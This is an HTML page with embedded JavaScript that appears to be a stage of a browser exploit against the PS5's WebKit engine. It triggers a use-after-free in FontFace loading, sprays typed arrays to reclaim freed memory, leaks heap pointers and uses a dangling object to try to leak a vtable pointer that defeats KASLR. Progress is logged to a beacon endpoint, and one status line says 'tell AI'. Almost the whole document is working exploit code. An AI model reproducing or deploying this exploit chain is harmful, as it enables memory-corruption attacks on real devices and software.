<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 16px/1.3 ui-monospace,monospace;padding:14px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:64px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:96px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:76vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1320 — start m_timeoutTimer so its vtable (.text) lands at buf[0x90] → read it = KASLR base</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1320';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|code-ptr|vtable/.test(z))return 'win';
  if(/hit|ok\b|dangling-ok/.test(z))return 'ok';
  if(/err|fail|crash|miss|nospray|cap|not-dangle/.test(z))return 'bad';
  if(/zero|none/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);while(LOG.childNodes.length>48)LOG.removeChild(LOG.firstChild);LOG.scrollTop=LOG.scrollHeight;}
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1320-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};
(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
var leaked={L1:null,L2:null,buf:null,W:null};
window.__lf=null;
var RC=0;try{RC=parseInt(sessionStorage.getItem('p1320_rc')||'0',10)||0;}catch(e){}
function reloadOnce(why){if(leaked.ok)return;if(RC>=4){B('CAP',why);S('capped — close+reopen','#4a2a12');return;}try{sessionStorage.setItem('p1320_rc',String(RC+1));}catch(e){}setTimeout(function(){location.reload();},400);}

var K=32,SIZE=192,fired=false;
S('STAGE 1 — proven leak…','#13233a');
window.__sp=[];var fs=null;
try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
  fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(fired)return undefined;fired=true;
  try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
  for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(SIZE));w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;window.__sp.push(w);}
  return undefined;},set:function(){}});
B('S1-SETUP','armed');
try{document.fonts.load('1em vf, v1','AB').then(function(faces){window.__lf=faces;B('S1-RES','n'+(faces&&faces.length));setTimeout(leScan,80);},function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
setTimeout(function(){if(leaked.ok)return;if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','');reloadOnce('nospray');}},1500);
setTimeout(function(){if(!leaked.buf){leScan();}},700);
function leScan(){
  if(leaked.buf)return;var sp=window.__sp||[],hit=-1;
  for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}}
  if(hit<0){B('S1-MISS','');reloadOnce('miss');return;}
  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16));
  var W=null,which='';var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(['lf'+i,window.__lf[i]]);
  leaked.buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i][1].status;}catch(e){st='E';}if(st==='error'){W=cands[i][1];which=cands[i][0];break;}}
  leaked.buf[0x82]=3;
  if(!W){B('NOT-DANGLE','');reloadOnce('notdangle');return;}
  leaked.W=W;leaked.ok=true;B('DANGLING-OK',which);S('DANGLING '+which+' — timer-start hunt…','#0c7a3a');
  setTimeout(hunt,120);
}

/* ═══ try to start m_timeoutTimer → vtable (.text) appears inline at buf[0x90] ═══ */
function dumpT(label){
  var buf=leaked.buf,parts=[],found=false;
  for(var off=0x88;off<0xC0;off+=8){var v=le(buf,off);
    if(v!==0n){var k=(v>=0x1000000000n&&v<0x9000000000n)?'heap':(v<0x100000n?'small':'CODE?');
      parts.push('0x'+off.toString(16)+'=0x'+v.toString(16)+'['+k+']');
      if(k==='CODE?'){found=true;B('CODE-PTR','WIN '+label+' @0x'+off.toString(16)+' = 0x'+v.toString(16)+' (timer vtable = WebKit .text!)');S('CODE PTR LEAKED !!! tell AI','#0a7a2a');}}}
  B('T-'+label,parts.length?parts.join(' '):'0x88-0xB8 all-zero');
  return found;
}
function hunt(){
  if(window.__h)return;window.__h=true;
  var buf=leaked.buf,W=leaked.W;
  dumpT('base');
  buf[0x82]=1; /* Loading */ try{var p=W.load();if(p&&p.then)p.then(function(){},function(){});B('SEQ1','loading+load ok');}catch(e){B('SEQ1-ERR',(''+(e&&e.message||e)).slice(0,40));}
  dumpT('s1');
  buf[0x82]=0; /* Pending */ try{var p2=W.load();if(p2&&p2.then)p2.then(function(){},function(){});B('SEQ2','pending+load ok');}catch(e){B('SEQ2-ERR',(''+(e&&e.message||e)).slice(0,40));}
  dumpT('s2');
  try{void W.loaded;B('SEQ3','loaded-touch ok');}catch(e){B('SEQ3-ERR',(''+(e&&e.message||e)).slice(0,40));}
  dumpT('s3');
  try{document.fonts.add(W);var p4=W.load();if(p4&&p4.then)p4.then(function(){},function(){});B('SEQ4','add+load ok');}catch(e){B('SEQ4-ERR',(''+(e&&e.message||e)).slice(0,40));}
  dumpT('s4');
  /* delayed: timers fire async; dump after a tick */
  setTimeout(function(){dumpT('s5-delayed');setTimeout(function(){dumpT('s6-late');finish();},600);},200);
}
function finish(){if(window.__fin)return;window.__fin=true;B('DONE','p1320');S('P1320 COMPLETE — press the run button','#1b2330');}
</script>
</body></html>
